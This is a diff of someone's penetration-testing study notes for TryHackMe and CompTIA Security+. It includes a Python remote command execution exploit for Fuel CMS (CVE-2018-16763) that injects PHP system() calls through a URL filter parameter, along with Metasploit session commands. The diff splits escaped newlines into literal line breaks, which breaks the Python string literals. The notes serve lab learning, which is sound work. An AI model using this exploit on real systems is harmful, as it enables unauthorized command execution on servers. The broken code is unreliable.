@@ -1,5 +1,8 @@
 # ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester
 
+author:: Nathan Acks  
+date:: 2022-04-13
+
 ## ITPro.TV: CompTIA Security+ (SY0-601)
 
 ### Digital Forensics Concepts
@@ -54,15 +57,20 @@ delimeter2 = '</div>'
 def exploit():
 	while True:
 		try:
-			payload = input("\n[+] OS Command: ")
+			payload = input("
+[+] OS Command: ")
 			response = requests.get(f"{args.URL}/fuel/pages/select/?filter='%2Bpi(%24a%3D('system'))%2B%24a('{payload}')%2B'")
 			htmlText = str(BeautifulSoup(response.text,'html.parser'))
 			array1 = htmlText.split(delimeter1)
 			array2 = array1[1].split(delimeter2)
-			print('\n' + array2[-1].replace('\n\n',''))
+			print('
+' + array2[-1].replace('
+
+',''))
 
 		except error:
-			exit('\n[-] Could Not Connect To Server')
+			exit('
+[-] Could Not Connect To Server')
 
 if __name__ == '__main__':
 
@@ -73,7 +81,8 @@ if __name__ == '__main__':
 	try:
 		exploit()
 	except KeyboardInterrupt:
-		exit('\n[!] Quitting')
+		exit('
+[!] Quitting')
 ```
 
 * [THM-Vulnerability_Capstone-CVE-2018-16763](https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763)
@@ -130,8 +139,3 @@ You can reset individual parameters using `unset`, and reset the entire module u
 Some exploit modules have a `check` option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many *don’t* have a check at all. YMMV!
 
 Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.
-
-- - - -
-
-<span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> April 13, 2022
